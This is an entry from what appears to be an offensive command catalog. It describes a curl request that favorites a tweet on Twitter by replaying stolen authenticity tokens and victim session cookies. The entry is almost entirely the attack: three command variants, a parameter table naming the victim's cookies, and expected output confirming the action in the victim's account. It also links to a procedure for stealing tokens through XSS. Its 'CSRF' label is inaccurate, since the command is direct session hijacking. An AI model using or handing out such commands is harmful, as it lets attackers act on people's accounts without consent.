---
id: cmd-curl-twitter-csrf-favorite
data: >-
  curl -X POST 'https://twitter.com/i/tweet/favorite' -d
  'authenticity_token=STOLEN_AUTHENTICITY_TOKEN' -d 'id=1234567890' -H
  'X-CSRF-Token: STOLEN_TOKEN' -H 'Cookie: ct0=VICTIM_SESSION_COOKIE;
  auth_token=VICTIM_AUTH_TOKEN'
tags:
  - csrf
  - twitter
type: command
output: HTTP/1.1 200 OK or redirect to tweet page
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.688Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-favorite-tweet

## Command

```bash
curl -X POST 'https://twitter.com/i/tweet/favorite' \
  -d 'authenticity_token=STOLEN_AUTHENTICITY_TOKEN' \
  -d 'id=1234567890' \
  -H 'X-CSRF-Token: STOLEN_TOKEN' \
  -H 'Cookie: ct0=VICTIM_SESSION_COOKIE; auth_token=VICTIM_AUTH_TOKEN'
```

## Description

Performs a CSRF attack on Twitter to favorite a tweet using a stolen authenticity_token, bypassing normal permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'authenticity_token=...'` | Stolen form token | Yes |
| `-d 'id=...'` | Target tweet ID | Yes |
| `-H 'Cookie: ...'` | Victim's session cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://twitter.com/i/tweet/favorite' -d 'id=123' -d 'authenticity_token=abc' -H 'Cookie: auth_token=xyz'
```

### Advanced Usage

```bash
curl -X POST 'https://twitter.com/i/tweet/favorite' -d 'id=1234567890' -d 'authenticity_token=STOLEN' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: ct0=...; auth_token=...'
```

## Expected Output

HTTP 200 or 302 redirect; tweet favorited in victim's account. 403 if token invalid.

## Related

- [[Related Procedure: Execute-XSS-Payload-and-Steal-Authenticity-Token]]
